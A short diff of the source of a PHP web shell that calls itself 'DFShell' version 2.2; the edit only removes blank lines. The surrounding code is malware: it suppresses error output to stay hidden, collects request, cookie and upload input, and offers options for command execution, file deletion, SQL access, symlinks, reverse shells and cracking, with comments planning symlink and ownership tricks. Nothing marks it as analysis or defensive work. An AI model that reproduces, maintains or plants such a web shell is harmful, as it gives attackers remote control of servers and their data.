@@ -5,7 +5,6 @@ ini_set('display_startup_errors', 0);
 error_reporting(0);
 
 // creating session
-
 session_start();
 $DFShell_Ver = 2.2;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
@@ -17,7 +16,6 @@ $DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mas
 
 #new update will use chdir(); function
 #readlink("symlink_file"),lchgrp(symlink_file, uid),lchown(symlink_file, 8) function
-
 
 class DFShell{
 
